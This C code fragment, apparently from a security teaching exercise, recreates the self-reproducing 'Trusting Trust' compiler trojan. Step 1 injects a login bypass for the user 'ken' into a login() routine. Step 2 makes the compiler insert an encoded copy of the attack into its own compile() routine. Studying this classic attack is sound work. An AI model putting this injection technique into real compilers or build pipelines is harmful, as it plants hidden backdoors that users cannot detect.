/*****************************************************************
 * Step 1:
 */

// match on the start of the login() routine:
static char login_sig[] = "int login(char *user) {";
int sig_length = strlen(login_sig);
char *result = strstr(program, login_sig);
if (result != NULL) {
    int index = result - program + sig_length;

    // Slice into two parts
    char firstPart[10000];
    char secondPart[10000];
    strncpy(firstPart, program, index);
    firstPart[index] = '\0';
    strcpy(secondPart, program + index);
    secondPart[strlen(program) - index] = '\0';

    // and inject an attack for "ken":
    static char login_attack[] = "\nif(strcmp(user, \"ken\") == 0) return 1;\n";
    fp = fopen("./temp-out.c", "w");
    assert(fp);
    fprintf(fp, "%s", firstPart);
    fprintf(fp, "%s", login_attack);
    fprintf(fp, "%s", secondPart);
    program = "";
}
    

/*****************************************************************
 * Step 2:
 */

// search for the start of the compile routine: 
static char compile_sig[] =
        "static void compile(char *program, char *outname) {\n"
        "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
        "    assert(fp);"
        ;
int compile_sig_length = strlen(compile_sig);
char *compile_result = strstr(program, compile_sig);
if (compile_result != NULL) {
    int index = compile_result - program + compile_sig_length;

    // Slice into two parts
    char firstPart[10000];
    char secondPart[10000];
    strncpy(firstPart, program, index);
    firstPart[index] = '\0';
    strcpy(secondPart, program + index);
    secondPart[strlen(program) - index] = '\0';

    // and inject a placeholder "attack":
    // inject this after the assert above after the call to fopen.
    // not much of an attack.   this is just a quick placeholder.
    // and inject an attack for "ken":
    /*static char compile_attack[] 
            = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";*/
    int i;
    fp = fopen("./temp-out.c", "w");
    assert(fp);
    fprintf(fp, "%s", firstPart);
    fprintf(fp, "\nchar prog[] = {\n");
    for(i = 0; prog[i]; i++)
        fprintf(fp, "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
    fprintf(fp, "0 };\n");
    fprintf(fp, "%s", prog);
    fprintf(fp, "%s", secondPart);
    program = "";
}
